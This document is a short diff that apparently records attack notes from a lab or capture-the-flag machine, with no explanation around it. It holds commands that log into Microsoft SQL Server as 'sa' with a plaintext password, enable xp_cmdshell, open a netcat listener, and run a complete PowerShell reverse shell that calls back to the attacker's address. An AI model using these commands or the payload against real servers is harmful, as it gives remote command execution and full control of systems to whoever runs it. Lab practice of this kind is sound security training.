@@ -1,0 +1,5 @@
+mssqlclient.py 'sa:MSSQLP@ssw0rd!'@10.10.11.51
+exec sp_configure 'xp_cmdshell', 1;
+reconfigure;
+nc -lvnp 5555
+EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.7'',5555);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
